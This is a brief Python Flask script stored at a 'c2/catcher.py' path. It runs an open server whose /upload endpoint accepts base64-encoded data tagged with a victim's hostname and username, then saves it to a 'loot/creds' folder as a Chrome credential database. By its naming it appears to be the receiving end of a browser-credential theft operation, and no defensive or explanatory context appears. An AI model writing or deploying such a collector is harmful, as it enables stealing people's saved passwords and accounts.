# ~/hexbox/c2/catcher.py
from flask import Flask, request
import base64, os
app = Flask(__name__)
@app.route("/upload", methods=["POST"])
def up():
    h = request.form.get("host","unk"); u = request.form.get("user","unk")
    data = base64.b64decode(request.form["data"])
    fn = f"/home/pi/hexbox/loot/creds/{h}_{u}_chrome.db"
    os.makedirs(os.path.dirname(fn), exist_ok=True)
    open(fn,"wb").write(data)
    return "OK"
app.run("0.0.0.0", 8000)
